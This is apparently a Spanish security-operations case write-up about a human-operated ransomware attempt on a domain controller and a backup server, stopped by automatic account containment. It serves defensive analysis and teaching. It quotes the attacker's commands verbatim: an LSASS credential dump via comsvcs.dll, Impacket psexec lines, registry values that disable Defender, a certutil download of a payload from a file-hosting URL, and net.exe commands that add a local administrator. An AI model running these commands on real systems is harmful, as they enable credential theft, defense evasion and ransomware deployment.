# Caso 33 — Hands-On Keyboard Attack: Intento de Ransomware Detenido por Attack Disruption

## Resumen narrativo

Durante una guardia nocturna, el sistema generó un incidente de prioridad máxima (100/100) con 37 alertas activas. El análisis forense reveló un ataque humano-operado en curso que intentó comprometer un Domain Controller y el servidor de backups de la organización con el objetivo de desplegar ransomware.

El atacante ingresó con credenciales comprometidas de una cuenta Domain Admin (`[username-msco]`) a las 22:50 y en menos de 2 horas intentó robar credenciales de memoria, deshabilitar Defender, descargar el payload de ransomware y comprometer el servidor de backups [software-backup]. Attack Disruption de Defender XDR contuvo automáticamente la cuenta comprometida a la 01:03 AM, deteniendo el ataque antes de que el ransomware pudiera ejecutarse.

---

## Tabla de detalles del incidente

| Campo | Detalle |
|---|---|
| **Incident ID** | 40 |
| **Título** | Hands-on keyboard attack was launched from a compromised account (attack disruption) |
| **Clasificación** | ✅ True Positive |
| **Severidad** | High |
| **Priority Score** | 100/100 |
| **Primera actividad** | Apr 22, 2026 — 22:50 PM |
| **Última actividad** | Apr 23, 2026 — 22:52 PM |
| **Duración del ataque activo** | ~2 horas (22:50 PM → 01:03 AM) |
| **Dispositivos afectados** | `[hostname-dc1].[org-domain]` (DC), `[hostname-veeam]` |
| **Usuarios comprometidos** | `[username-msco]` (Domain Admin), `[admin-user]` (Administrator) |
| **Herramientas del atacante** | Impacket, CrackMapExec, comsvcs.dll, certutil.exe, net.exe, WMI |
| **Malware detectado** | Ceprolad.A, DumpLsassProc.SA/C, Impacket.D, SuspRemoteCmdCommand.SA |
| **Fuente de detección** | Microsoft Defender for Endpoint (EDR), Defender XDR (Attack Disruption) |
| **Categorías MITRE** | Persistence, Defense Evasion, Credential Access, Lateral Movement, Malware |

---

## Proceso de investigación

### 1. Acceso inicial — Credenciales comprometidas

**22:50 PM — Primeras dos alertas**

La primera señal del ataque fue una alerta High:
> *"User's password was changed by a compromised account"*

Al analizar la alerta se identificó que la cuenta `[username-msco]` (Domain Admin, SID terminado en `-27358`) fue la cuenta comprometida de origen. Desde esta cuenta se reseteó la contraseña de `[admin-user]` (Administrator built-in, SID terminado en `-500`), otorgando al atacante control sobre dos cuentas Domain Admin simultáneamente.

La correlación en el incidente mostró:
- `[username-msco]` → 1 alerta (cuenta de entrada)
- `[admin-user]` (SID -500) → 18 alertas (cuenta de trabajo del atacante)

**MITRE:** T1078 — Valid Accounts | T1098 — Account Manipulation

---

### 2. Reconocimiento y ejecución remota via WMI

**22:50 PM — 23:01 PM**

Se identificó el proceso `WmiPrvSE.exe -secured -Embedding` (PID 2088) corriendo bajo `NT AUTHORITY\Servicio de red`. Este proceso indica que el atacante ejecutó comandos remotamente via WMI desde una máquina externa.

Cadena de ejecución identificada:
```
Atacante remoto → WMI → WmiPrvSE.exe → services.exe → cmd.exe → payload malicioso
```

**MITRE:** T1047 — Windows Management Instrumentation | T1021.006 — Remote Services: Windows Remote Management

---

### 3. Intentos de volcado de credenciales LSASS — 5 intentos bloqueados

**23:01 PM — 00:47 AM**

El atacante intentó obtener credenciales del proceso LSASS usando múltiples técnicas y canales:

| Hora | Método | Servicio falso | Archivo de salida | Resultado |
|---|---|---|---|---|
| 23:01 PM | comsvcs.dll via cmd | `aXypWTL7` | `7fQMah6aZ.dll` | ❌ Bloqueado |
| 23:03 PM | comsvcs.dll via cmd | `cPz5L9I6` | `xUc.icns` | ❌ Bloqueado |
| 23:01 PM | comsvcs.dll via cmd directo | — | `7fQMah6aZ.dll` | ❌ Bloqueado |
| 23:04 PM | comsvcs.dll via cmd directo | — | `xUc.icns` | ❌ Bloqueado |
| 00:46 AM | PowerShell -EncodedCommand | `TwWMYkHu` | `GgPkhDyx.sql` | ❌ Bloqueado |
| 00:46 AM | comsvcs.dll via services.exe | — | `GgPkhDyx.sql` | ❌ Bloqueado |
| 00:47 AM | comsvcs.dll via svchost.exe | — | `GgPkhDyx.sql` | ❌ Bloqueado |

El comando base decodificado del ataque PowerShell (Base64):
```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, `#+000024 (Get-Process lsass).Id \Windows\Temp\GgPkhDyx.sql full
```

Los servicios creados (`aXypWTL7`, `cPz5L9I6`, `TwWMYkHu`) usaban nombres aleatorios para disfrazarse de servicios legítimos de Windows (T1036.004 — Masquerade Task or Service).

**MITRE:** T1003.001 — LSASS Memory | T1543.003 — Windows Service | T1574.011 — Services Registry Permissions Weakness | T1036.004 — Masquerade Task or Service

---

### 4. Impacket — Movimiento lateral via SMB

**23:15 PM — 23:18 PM**

Después de los bloqueos de LSASS, el atacante cambió a Impacket psexec para ejecutar comandos remotamente via SMB:

```
cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1776910507.3092256 2>&1
cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1776910685.7232995 2>&1
```

Ambos intentos fueron bloqueados. La firma de Impacket psexec incluye la escritura de archivos temporales con formato `__[timestamp]` en el share ADMIN$.

**MITRE:** T1021.002 — SMB/Windows Admin Shares

---

### 5. Intento de deshabilitar Defender — 13+ intentos simultáneos

**00:43 AM**

El atacante usó `powershell.exe` (PID 2216, Integrity Level: High) bajo la cuenta `[admin-user]` para modificar claves de registro y deshabilitar Defender:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableAntiVirus = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpynetReporting = 0
```

Todos los intentos fueron bloqueados. La severidad del incidente fue escalada automáticamente de Medium a High en este momento.

**MITRE:** T1562.001 — Disable or Modify Tools

---

### 6. Descarga del payload Ceprolad y decodificación de VBScript

**01:02 AM**

El atacante intentó descargar el payload final del ransomware usando certutil (LOLBIN):

```
certutil -urlcache -split -f https://tmpfiles.org/dl/34773981/sys.zip C:\windows\temp\sys.zip
```

Bloqueado por Defender (Trojan:Win32/Ceprolad.A).

Inmediatamente después intentó decodificar un script VBScript usando el mismo certutil:

```
certutil -decode w.vbs dd.vbs
```

El proceso padre fue `cmd.exe` (PID 1968) bajo `[admin-user]` con Integrity Level High.

**MITRE:** T1105 — Ingress Tool Transfer | T1027 — Obfuscated Files or Information | T1218 — System Binary Proxy Execution (certutil)

---

### 7. ⚡ Attack Disruption — Contención automática

**01:03 AM**

Defender XDR detectó el patrón completo de ataque human-operated y ejecutó Attack Disruption automáticamente:

> **Administrador contained** — Attack Disruption

La cuenta `[admin-user]` fue contenida — bloqueando su capacidad de autenticarse en la red. La cuenta permaneció contenida durante **5 días** hasta el Apr 28 cuando fue liberada tras la remediación.

---

### 8. Movimiento lateral a servidor de backups [software-backup]

**01:43 AM — 01:51 AM** *(después de la contención, posiblemente con sesión previa activa)*

El atacante se movió al servidor `[hostname-veeam]` (Windows Server 2012 R2, en Workgroup — fuera del dominio):

| Hora | Acción | Herramienta | Resultado |
|---|---|---|---|
| 01:43 AM | Descarga de herramientas | `certutil.exe` (LOLBIN) | Sospechoso |
| 01:45 AM | Creación de cuenta local `server` | `net.exe user server /add` | Detectado |
| 01:46 AM | Elevación de privilegios | `net.exe localgroup administradores server /add` | Detectado |
| 01:51 AM | Ejecución remota | CrackMapExec via WmiPrvSE.exe | ❌ Bloqueado |

El typo `administradored` en el primer intento (corregido a `administradores` 24 segundos después) confirma operación manual del atacante.

**MITRE:** T1136.001 — Local Account | T1098 — Account Manipulation

---

## Tabla de respuesta y remediación

| Acción | Responsable | Estado |
|---|---|---|
| Attack Disruption contuvo cuenta `[admin-user]` | Defender XDR (automático) | ✅ Completado — 01:03 AM |
| Resetear contraseñas de `[username-msco]` y `[admin-user]` | Equipo IT cliente | ✅ Recomendado |
| Eliminar cuenta local `server` en `[hostname-veeam]` | Equipo IT cliente | ✅ Recomendado |
| Resetear cuenta `krbtgt` x2 (intervalo 10 horas) | Equipo IT cliente | ✅ Recomendado |
| Verificar integridad de backups en [software-backup] | Equipo IT cliente | ✅ Recomendado |
| Parchear Windows Server 2012 R2 o migrar a versión soportada | Equipo IT cliente | ⚠️ Urgente |
| Habilitar MFA para cuentas Domain Admin | Equipo IT cliente | ⚠️ Urgente |
| Revisar logs de NTDS.dit para posible exfiltración | Analista SOC | ✅ Recomendado |
| Implementar segmentación de red para servidor [software-backup] | Equipo IT cliente | ⚠️ Urgente |

---

## Lecciones aprendidas

1. **Attack Disruption es la primera línea de contención en ataques human-operated** — actuó en milisegundos sin intervención del analista, deteniendo el ataque antes de que el ransomware se ejecutara.

2. **Living Off the Land reduce la detección por firma** — el atacante usó exclusivamente herramientas nativas de Windows (certutil, rundll32, comsvcs.dll, net.exe, WMI) hasta el final. La detección fue posible gracias al análisis de comportamiento.

3. **El servidor de backups es siempre un objetivo pre-ransomware** — destruir los backups antes de cifrar la producción elimina la capacidad de recuperación sin pagar el rescate. [software-backup] debe estar segmentado de la red de producción.

4. **Windows Server 2012 R2 sin soporte amplía la superficie de ataque** — ambos servidores corrían un OS sin parches de seguridad desde octubre 2023.

5. **Una cuenta Domain Admin comprometida puede desencadenar un ataque completo** — el origen fue `[username-msco]` sin MFA. Una cuenta privilegiada sin segundo factor es una puerta de entrada crítica.

6. **El análisis forense debe seguir el Order of Volatility** — en ataques activos priorizar RAM y procesos activos antes de aislar el dispositivo para preservar evidencia.

---

## Herramientas utilizadas

- Microsoft Defender XDR — Attack Story, Evidence and Response, Activities
- Microsoft Defender for Endpoint (EDR) — detección y bloqueo
- CyberChef — decodificación Base64 de comandos PowerShell
- IPinfo.io — análisis de IPs externas
- MITRE ATT&CK Navigator — mapeo de técnicas

---

## MITRE ATT&CK

| Táctica | Técnica | ID |
|---|---|---|
| Initial Access | Valid Accounts | T1078 |
| Execution | Windows Management Instrumentation | T1047 |
| Execution | Service Execution | T1569.002 |
| Persistence | Create Account: Local Account | T1136.001 |
| Persistence | Windows Service | T1543.003 |
| Privilege Escalation | Account Manipulation | T1098 |
| Defense Evasion | Disable or Modify Tools | T1562.001 |
| Defense Evasion | Masquerade Task or Service | T1036.004 |
| Defense Evasion | Services Registry Permissions Weakness | T1574.011 |
| Defense Evasion | System Binary Proxy Execution | T1218 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |
| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 |
| Command and Control | Ingress Tool Transfer | T1105 |
